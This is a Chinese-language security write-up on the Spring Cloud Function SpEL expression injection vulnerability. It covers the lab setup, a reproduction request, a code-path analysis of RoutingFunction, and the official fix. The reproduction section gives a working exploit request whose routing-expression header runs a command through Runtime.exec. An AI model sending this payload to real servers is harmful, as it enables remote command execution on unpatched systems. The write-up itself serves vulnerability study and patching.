## **前言**

近日，Spring Cloud Function 官方测试用例曝光了 Spring Cloud Function SPEL
表达式注入漏洞，可利用该漏洞通过注入 SPEL 表达式来触发远程命令执行。Spring Cloud Function 是一个基于 Spring Boot
的函数计算框架。通过抽象传输细节和基础设施，为开发者保留熟悉的开发工具和开发流程，让开发者专注于实现业务逻辑，从而提高开发效率。

##  **影响版本**

3.0.0.RELEASE <= Spring Cloud Function <= 3.2.2

##  **环境构建**

    
    
    JDK: 17.0.2
    IDEA 2021.3 x64
    Windows 10 21H2

使用github上cckuailong师傅创建的环境。![](https://image.3001.net/images/20220408/1649396135_624fc9a7d5d36173b2bfc.png!small)

拉取仓库后用IDEA
maven进行打包调试即可。由于Spring默认端口使用的8080，所以可能会与Burpsuite冲突。可编辑application.properties修改默认端口。![](https://image.3001.net/images/20220408/1649396172_624fc9ccade558956baab.png!small)

##  **漏洞复现**

待服务端启动后，向Spring服务请求如下数据包。

    
    
    POST /speltest HTTP/1.1
    Host: 127.0.0.1:8090
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101Firefox/98.0
    Accept: 
    text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Connection: close
    Upgrade-Insecure-Requests: 1
    Sec-Fetch-Dest: document
    Sec-Fetch-Mode: navigate
    Sec-Fetch-Site: cross-site
    Pragma: no-cache
    Cache-Control: no-cache
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 0
    spring.cloud.function.routing-expression: 
    T(java.lang.Runtime).getRuntime().exec("calc.exe")

![](https://image.3001.net/images/20220408/1649396249_624fca19151d359710f88.png!small)

##  **漏洞分析**

首先来看一下官方提交的commit

https://github.com/spring-cloud/spring-cloud-function/commit/0e89ee27b2e76138c16bcba6f4bca906c4f3744f![](https://image.3001.net/images/20220408/1649396313_624fca5976b676a7f5293.png!small)

根据官方commit，可以得知该漏洞是由RoutingFunction功能所导致；

在commit中官方也给出了相应的测试用例。![](https://image.3001.net/images/20220408/1649396384_624fcaa0a6b68e4585688.png!small)

根据测试用例，可以得知漏洞触发点位于http header中spring.cloud.function.routing-expression字段。

首先，在所有路由的postmapping上打入断点，程序在进入到form后获取了当前的wapper，随后进入到ProcessRequest。![](https://image.3001.net/images/20220408/1649396418_624fcac27ab4f205c7b60.png!small)

跟进。![](https://image.3001.net/images/20220408/1649396450_624fcae26d99525191483.png!small)

在ProcessRequest中首先获取了当前wrapper的function，随后调用该function对象的apply。

![](https://image.3001.net/images/20220408/1649396663_624fcbb76c254f97e0719.png!small)

apply中紧接着调用了wrapper的doapply。

![](https://image.3001.net/images/20220408/1649396637_624fcb9dbc11fddbc9e06.png!small)doapply中首先判断wrapper是否是RoutingFunction，如果不是RoutingFunction则获取其target属性并调用其apply方法，而在此处当前wrapper的target属性正好是一个RoutingFunction。

![](https://image.3001.net/images/20220408/1649396691_624fcbd3210a508a6bc62.png!small)

apply中直接调用了route方法，所以直接来看route。在route中判断header头中是否有spring.cloud.function.routing-expression，随后调用FunctionFromExpression。

![](https://image.3001.net/images/20220408/1649396716_624fcbec771f81ad1db32.png!small)到FunctionFromExpression中，即调用Expression对传入的SPEL表达式进行解析，随后调用expression.getValue执行。![](https://image.3001.net/images/20220408/1649396737_624fcc01ad3cbea0fdc02.png!small)

##  **修复**

在修复版本中对header使用SimpleEvaluationContext进行安全处理。![](https://image.3001.net/images/20220408/1649396767_624fcc1f6d572790e2e76.png!small)

##  **参考**

https://github.com/spring-cloud/spring-cloud-function/commit/0e89ee27b2e76138c16bcba6f4bca906c4f3744f

  

